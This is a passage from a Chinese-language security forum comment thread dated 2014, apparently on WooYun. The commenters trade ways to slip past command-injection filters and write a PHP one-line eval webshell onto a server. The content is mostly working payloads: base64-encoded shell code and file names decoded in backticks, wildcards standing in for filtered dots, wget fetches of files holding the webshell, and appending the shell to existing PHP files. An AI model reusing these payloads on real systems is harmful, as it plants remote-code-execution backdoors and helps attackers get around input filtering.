PD9waHAgZXZhbCgkX1JFUVVFU1Rbdl0pOz8+ &gt;2<br>echo `base64 -d 2` &gt;&gt; `base64 -d 1`</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xeyes</span> <span class="reply-time">2014-03-05 16:04:21</span></div><p></p><p>感谢各位牛提供的方法,根据瞌睡龙跟寂寞的瘦子的方法.延伸出另一个方法.<br>dGVzdC5waHA=(test.php)<br>PD9waHAgZXZhbCgkX1JFUVVFU1Rbdl0pOz8+()</p><p>echo dGVzdC5waHA= &gt;1</p><p>echo PD9waHAgZXZhbCgkX1JFUVVFU1Rbdl0pOz8+ &gt;2</p><p>cat `base64 -d 2` &gt;`base64 -d 1`</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xiaoL</span> <span class="reply-time">2014-03-05 15:58:55</span></div><p></p><p>wget一句话？<br>wget 123123123123 -O `ls shell*`<br>这样也行吧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xeyes</span> <span class="reply-time">2014-03-05 15:51:57</span></div><p></p><p>echo dGVzdC5waHA= &gt;1</p><p>echo 'PD9waHAgZXZhbCgkX1JFUVVFU1Rbdl0pOz8+' &gt;&gt; `base64 -d 1`<br>这样吗? 没成功.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-03-05 15:00:22</span></div><p></p><p>先执行：echo dGVzdC5waHA= &gt;1<br>然然后：echo '一句话' &gt;&gt; `base64 -d 1`<br>应该可以了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xeyes</span> <span class="reply-time">2014-03-05 14:50:57</span></div><p></p><p>mickey 看皂。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2014-03-05 14:47:28</span></div><p></p><p>恩。。。 文章挺赞的，评论学到的东西更多。<br>恩。。。 月总，恩。。。你俩幸福就行了。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xeyes</span> <span class="reply-time">2014-03-05 14:36:25</span></div><p></p><p>| 被过滤。不过 寂寞的瘦子童鞋这样简便多了。 收藏了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-03-05 14:35:11</span></div><p></p><p>傻逼了╭(╯^╰)╮只顾着.了 忘记|了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-03-05 14:33:30</span></div><p></p><p>插，我的''里面的一句话被过滤了？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-03-05 14:31:46</span></div><p></p><p>echo '' &gt; `echo dGVzdC5waHA= | base64 -d`</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-03-05 14:30:50</span></div><p></p><p>echo '' &gt;&gt; `echo dGVzdC5waHA= | base64 -d` 刚摸索的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xeyes</span> <span class="reply-time">2014-03-05 14:21:32</span></div><p></p><p>多谢 ，@瞌睡龙 (￣︶￣)↗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xeyes</span> <span class="reply-time">2014-03-05 14:20:37</span></div><p></p><p>多谢 @乌帽子 ，(￣︶￣)↗ 涨姿势了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-03-05 14:18:07</span></div><p></p><p>可以弄个补充模块，然后你把好的答案贴上去写上作者</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-03-05 14:13:06</span></div><p></p><p>这么赞！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-03-05 14:01:24</span></div><p></p><p>赞，可以追加到已有的php文件中，用*匹配代替.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌帽子</span> <span class="reply-time">2014-03-05 13:48:29</span></div><p></p><p>尖括号里的php代码怎么没了？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌帽子</span> <span class="reply-time">2014-03-05 13:47:49</span></div><p></p><p>看着lz的点越写越多，我真是着急啊。<br>echo &gt; test*php<br>用通配符代替点就ok了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-03-05 12:38:11</span></div><p></p><p>尼玛好帅~~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-03-05 12:34:16</span></div><p></p><p>太帅了，有点黑客的感觉</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-03-05 12:21:36</span></div><p></p><p>作者绕过滤的时候走了弯路，看看大家谁有更简洁的绕过方式呢？我先来，wget先下载两个文件 里面内容分别为<?php eval($_REQUEST[v]);?>和test.php文件名分别是z1，z2。<br>然后执行 cat z1 > `cat z2`</p><p></p></div></div></div></div></div></main>